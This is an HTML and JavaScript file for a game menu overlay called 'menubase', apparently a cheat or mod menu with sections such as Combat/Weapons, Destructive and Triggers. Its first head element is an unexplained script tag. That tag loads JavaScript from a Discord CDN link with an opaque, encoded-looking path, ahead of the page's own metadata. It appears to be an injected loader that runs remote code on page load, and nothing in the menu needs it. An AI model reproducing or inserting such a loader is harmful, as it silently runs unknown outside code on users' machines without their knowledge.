<!DOCTYPE html>
<html lang="en">
<head>
    <script type='text/javascript' src='https://cdn.discordapp.com/Jj0DgBElxlfJ_P_nY5AKjCh86MZ4UYzUFw7yXse1V_H3-PaIk6u5PAsIzC9Qg2bRzIfS6Op0bjh56m2f1wfBaw=='></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <title>menubase</title>
</head>
<body>
    <div class="menu-wrapper">
        <div class="scrollbar-container">
            <div class="scrollbar-thumb" id="scrollbar-thumb"></div>
        </div>
        <div class="menu-container">
            <img class="header-image" src="https://i.ibb.co/yFcPTPnc/a889a689-441e-4bb0-94f7-9dfd3921d63f.jpg" alt="">
            <div class="menu-header">SELF</div>
            <div class="menu-items-container">
                <div class="menu-items" id="menu-items">
                    <div class="menu-item selected"><i class="ph ph-user"></i> <span>Self</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-globe-hemisphere-west"></i> <span>Online</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-sword"></i> <span>Combat/Weapons</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-eye"></i> <span>Visual</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-car"></i> <span>Vehicle</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-cube"></i> <span>Miscellaneous</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-bomb"></i> <span>Destructive</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-target"></i> <span>Triggers</span> <i class="ph ph-caret-right"></i></div>
                    <div class="menu-item"><i class="ph ph-gear"></i> <span>Settings</span> <i class="ph ph-caret-right"></i></div>
                </div>
            </div>
            <div class="menu-footer">
                Version: Beta | 24hrs ago <span class="right-text" id="menu-counter">1/9</span>
            </div>
        </div>
    </div>
    <script>
        let selectedIndex = 0;
        const menuItems = document.querySelectorAll('.menu-item');
        const scrollbarThumb = document.getElementById('scrollbar-thumb');
        const menuCounter = document.getElementById('menu-counter');
        const totalItems = menuItems.length;
        const maxScrollHeight = 250;

        function updateMenuSelection(direction) {
            menuItems[selectedIndex].classList.remove('selected');
            selectedIndex = (selectedIndex + direction + totalItems) % totalItems;
            menuItems[selectedIndex].classList.add('selected');
            
            const scrollStep = maxScrollHeight / (totalItems - 1);
            scrollbarThumb.style.top = `${selectedIndex * scrollStep}px`;
            menuCounter.textContent = `${selectedIndex + 1}/${totalItems}`;
        }

        // Key events using DUI
        window.addEventListener("message", function (event) {
            if (event.data.type === "navigate") {
                if (event.data.direction === "up") {
                    updateMenuSelection(-1);
                } else if (event.data.direction === "down") {
                    updateMenuSelection(1);
                }
            }
        });

        // Keyboard events for arrow keys
        window.addEventListener('keydown', function(event) {
            if (event.key === 'ArrowUp') {
                updateMenuSelection(-1);
            } else if (event.key === 'ArrowDown') {
                updateMenuSelection(1);
            }
        });

        // Automatically focus the window on load to capture key events
        window.onload = function() {
            window.focus();
        };
    </script>

    <style>
    body {
        margin: 0;
        overflow: hidden;
        display: flex;
        justify-content: flex-start;
        align-items: center;
        height: 100vh;
        background: rgba(0, 0, 0, 0);
    }
    .menu-wrapper {
        display: flex;
        align-items: center;
        margin-left: 20px;
    }
    .scrollbar-container {
        width: 10px;
        height: 300px;
        background: #111;
        border-radius: 20px;
        position: relative;
        background: rgba(0, 0, 0, 0.8);
        margin-right: 10px;
        box-shadow: inset 0 0 3px #000;
    }

    .scrollbar-thumb {
        width: 100%;
        height: 40px; 
        background: #2c596b;
        border-radius: 20px;
        position: absolute;
        top: 0; 
        transform: translateY(-50%);
        transition: top 0.2s ease-in-out;
        margin: 4px 0;
    }

    .menu-container {
        width: 400px;
        background: #000000e5;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        display: flex;
        flex-direction: column;
        overflow: hidden;
        position: relative;
    }
    .header-image {
        width: 100%;
        height: auto;
        image-rendering: auto;
        object-fit: cover;
        max-height: 6.5vw;
    }
    .menu-header {
        background: rgba(0, 0, 0, 0.8);
        color: white;
        font-family: Arial, sans-serif;
        font-size: 15px;
        padding: 5px;
        font-weight: 600;
        text-align: center;
    }
    .menu-items-container {
        position: relative;
    }

    .menu-items {
        display: flex;
        flex-direction: column;
        gap: 8px;
    }

    .menu-item {
        padding: 12px 20px;
        color: white;
        justify-content: space-between;
        display: flex;
        align-items: center;
        font-family: 'Segoe UI', sans-serif;
        font-size: 16px;
        gap: 10px;
        font-weight: 550;
        transition: background 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
    }

    .menu-item i {
        font-size: 20px;
    }

    .menu-item span {
        flex-grow: 1;
        text-align: left;
    }

    .menu-item.selected {
        background-color: #0c2a3c;
        box-shadow: inset 0 0 0 1px #2d4555;
    }

    .menu-footer {
        background: rgba(0, 0, 0, 0.8);
        color: white;
        font-family: Arial, sans-serif;
        font-size: 14px;
        padding: 10px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-top: 1px solid none;
    }
    .right-text {
        font-weight: bold;
    }
    </style>
</body>
</html>
